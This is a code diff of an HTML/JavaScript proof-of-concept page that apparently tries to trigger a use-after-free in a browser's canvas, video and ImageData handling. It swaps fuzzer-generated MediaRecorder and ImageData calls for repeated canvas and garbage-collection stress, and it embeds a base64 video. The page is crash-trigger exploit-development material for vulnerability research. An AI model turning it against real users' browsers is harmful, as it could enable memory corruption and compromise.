@@ -27,27 +27,13 @@
     <button id="trigger">Trigger PoC</button>
     <div id="status">Idle...</div>
     <canvas id="canvas" width="512" height="512"></canvas>
-    <video id="video" loopend="1" src="data:video/mp4;base64,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"></video>
+    <video id="video" loopend="1" src="data:video/mp4;base64,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"></video>
     <script>
         const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
         const video = document.getElementById('video');
         const status = document.getElementById('status');
         let attemptCount = 0;
-        const fuzzervars = {};
-        const myFeedback = [];
-
-        function UpdateFeedback(line, res) {
-            myFeedback.push([line, res]);
-            status.textContent = `Feedback: ${line} -> ${res}`;
-        }
-
-        function GetVariable(fuzzervars, var_type) {
-            return fuzzervars[var_type] || null;
-        }
-
-        function SetVariable(fuzzervars, var_name, var_type) {
-            fuzzervars[var_type] = var_name;
-        }
 
         function stressGC() {
             for (let i = 0; i < 300; i++) {
@@ -56,12 +42,14 @@
         }
 
         function drawOnCanvas() {
-            const ctx = canvas.getContext('2d');
             ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.beginPath();
             ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
             ctx.fill();
+            // Stress with ImageData
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            ctx.putImageData(imageData, 0, 0);
         }
 
         function triggerExploit() {
@@ -69,53 +57,15 @@
             status.textContent = `Attempt ${attemptCount} in progress...`;
 
             try {
-                // Mimic eventhandler1
-                let var00034 = canvas; // Use existing canvas
-                UpdateFeedback("Using existing canvas", "Valid");
-                if (var00034) {
-                    SetVariable(fuzzervars, var00034, 'HTMLCanvasElement');
-                    UpdateFeedback("Set HTMLCanvasElement", "Valid");
-                }
-
-                let var00028 = GetVariable(fuzzervars, 'HTMLCanvasElement');
-                if (!var00028) {
-                    UpdateFeedback("var00028 null", "Error");
-                    return;
-                }
-
-                const stream = var00028.captureStream(30);
-                UpdateFeedback("var00028.captureStream()", "Valid");
-                if (stream) {
-                    SetVariable(fuzzervars, stream, 'MediaStream');
-                    UpdateFeedback("Set MediaStream", "Valid");
-                }
-
-                let var00014 = GetVariable(fuzzervars, 'MediaStream');
-                const options = {};
-                let var00013 = null;
-                try {
-                    var00013 = new MediaRecorder(var00014, options);
-                    UpdateFeedback("new MediaRecorder", "Valid");
-                } catch (e) {
-                    UpdateFeedback("new MediaRecorder", e.name);
-                }
-
-                let var00012 = var00013 ? var00013.videoBitsPerSecond || 1000000 : 1000000;
-                UpdateFeedback("Access videoBitsPerSecond", "Valid");
-
-                const textarea = document.createElement("textarea");
-                UpdateFeedback("document.createElement('textarea')", "Valid");
-                const cols = textarea.cols || 20;
-
-                try {
-                    new ImageData(var00012, cols, {});
-                    UpdateFeedback("new ImageData", "Valid");
-                } catch (e) {
-                    UpdateFeedback("new ImageData", e.name);
-                }
-
                 // Intensive drawing
                 const drawInterval = setInterval(drawOnCanvas, 5);
+
+                // Stress with multiple ImageData operations
+                const imageData = ctx.createImageData(512, 512);
+                for (let i = 0; i < imageData.data.length; i++) {
+                    imageData.data[i] = Math.random() * 255;
+                }
+                ctx.putImageData(imageData, 0, 0);
 
                 // Check for UAF
                 setTimeout(() => {
